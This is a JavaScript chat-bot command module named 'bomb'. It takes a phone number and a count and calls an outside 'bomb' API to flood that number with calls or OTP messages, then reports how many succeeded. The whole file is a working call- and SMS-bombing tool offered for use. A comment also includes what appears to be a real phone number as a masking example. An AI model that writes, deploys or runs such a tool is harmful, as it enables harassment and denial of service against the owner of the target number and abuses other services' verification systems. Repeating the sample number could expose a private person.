import axios from 'axios';

const config = {
    name: "bomb",
    description: "Send calls via bomb API",
    usage: "/bomb <phone> <count> OR /bomb <api> <phone> <count>",
    cooldown: 3,
    permissions: [2],
    credits: "LIKHON AHMED"
};

export async function onCall({ message, userPermissions, args }) {
    if (!userPermissions.includes(2)) {
        return message.reply("❌ You don't have permission to use this command.");
    }

    if (!args || args.length < 2) {
        return message.reply("❌ Usage: /bomb <phone> <count> OR /bomb <api> <phone> <count>");
    }

    let url = "";
    let phone = "";
    let count = 1;
    let api = null;

    // Case 1: /bomb <phone> <count>
    if (args.length === 2) {
        phone = args[0].replace(/[^0-9]/g, '');
        count = parseInt(args[1]);
        url = `https://update-bomb.onrender.com/ck?phone=${phone}&count=${count}`;
    }

    // Case 2: /bomb <api> <phone> <count>
    else if (args.length === 3) {
        api = args[0];
        phone = args[1].replace(/[^0-9]/g, '');
        count = parseInt(args[2]);
        url = `https://update-bomb.onrender.com/check?api=${api}&phone=${phone}&count=${count}`;
    }

    // Phone validation
    if (!/^\d{11}$/.test(phone)) {
        return message.reply("❌ Invalid phone number. Must be 11 digits.");
    }
    if (isNaN(count) || count < 1) {
        return message.reply("❌ Invalid count. Must be a number greater than 0.");
    }

    try {
        const res = await axios.get(url);

        // Mask phone number (e.g., 01761838316 → 01761****16)
        const maskedPhone = phone.slice(0, 5) + "****" + phone.slice(-2);

        // Count successful OTPs
        const successCount = Array.isArray(res.data) ? res.data.length : (res.data.count || count);

        // JSON response
        const response = {
            number: maskedPhone,
            OTP: successCount,
            author: "LIKHON AHMED"
        };

        message.reply(JSON.stringify(response, null, 2));
    } catch (err) {
        message.reply(`❌ Error calling API: ${err.message}`);
    }
}

export default {
    config,
    onCall
};
